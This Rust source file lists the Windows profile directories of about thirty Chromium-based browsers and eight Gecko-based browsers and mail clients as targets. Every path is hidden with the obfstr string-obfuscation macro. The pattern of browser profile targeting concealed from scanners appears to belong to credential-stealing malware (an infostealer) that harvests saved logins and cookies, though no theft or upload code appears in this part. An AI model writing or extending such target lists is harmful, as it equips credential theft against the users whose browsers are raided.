pub mod chromium {
    pub fn get_targets() -> Vec<String> {
        let mut targets = Vec::new();
    
        targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera Stable").to_string());
        targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera GX").to_string());
        targets.push(obfstr::obfstr!("Local\\Google\\Chrome").to_string());
        targets.push(obfstr::obfstr!("Local\\Google(x86)\\Chrome").to_string());
        targets.push(obfstr::obfstr!("Local\\BraveSoftware\\Brave-Browser").to_string());
        targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser").to_string());
        targets.push(obfstr::obfstr!("Local\\Chromunium").to_string());
        targets.push(obfstr::obfstr!("Local\\Chromium").to_string());
        targets.push(obfstr::obfstr!("Local\\Epic Privacy Browser").to_string());
        targets.push(obfstr::obfstr!("Local\\Amigo").to_string());
        targets.push(obfstr::obfstr!("Local\\Vivaldi").to_string());
        targets.push(obfstr::obfstr!("Local\\Orbitum").to_string());
        targets.push(obfstr::obfstr!("Local\\Mail.Ru\\Atom").to_string());
        targets.push(obfstr::obfstr!("Local\\Kometa").to_string());
        targets.push(obfstr::obfstr!("Local\\Comodo\\Dragon").to_string());
        targets.push(obfstr::obfstr!("Local\\Torch").to_string());
        targets.push(obfstr::obfstr!("Local\\Comodo").to_string());
        targets.push(obfstr::obfstr!("Local\\Slimjet").to_string());
        targets.push(obfstr::obfstr!("Local\\360Browser\\Browser").to_string());
        targets.push(obfstr::obfstr!("Local\\Maxthon3").to_string());
        targets.push(obfstr::obfstr!("Local\\K-Melon").to_string());
        targets.push(obfstr::obfstr!("Local\\Sputnik\\Sputnik").to_string());
        targets.push(obfstr::obfstr!("Local\\Nichrome").to_string());
        targets.push(obfstr::obfstr!("Local\\CocCoc\\Browser").to_string());
        targets.push(obfstr::obfstr!("Local\\uCozMedia\\Uran").to_string());
        targets.push(obfstr::obfstr!("Local\\Chromodo").to_string());
        targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser").to_string());
        targets.push(obfstr::obfstr!("Local\\Microsoft\\Edge").to_string());
        
        targets
    }
}

pub mod gecko {
    pub fn get_targets() -> Vec<String> {
        let mut targets = Vec::new();
    
        targets.push(obfstr::obfstr!("Roaming\\Mozilla\\Firefox").to_string());
        targets.push(obfstr::obfstr!("Local\\Waterfox").to_string());
        targets.push(obfstr::obfstr!("Local\\K-Meleon").to_string());
        targets.push(obfstr::obfstr!("Local\\Thunderbird").to_string());
        targets.push(obfstr::obfstr!("Local\\Comodo\\IceDragon").to_string());
        targets.push(obfstr::obfstr!("Local\\8pecxstudios\\Cyberfox").to_string());
        targets.push(obfstr::obfstr!("Local\\NETGATE Technologies\\BlackHaw").to_string());
        targets.push(obfstr::obfstr!("Local\\Moonchild Productions\\Pale Moon").to_string());
        
        targets
    }
}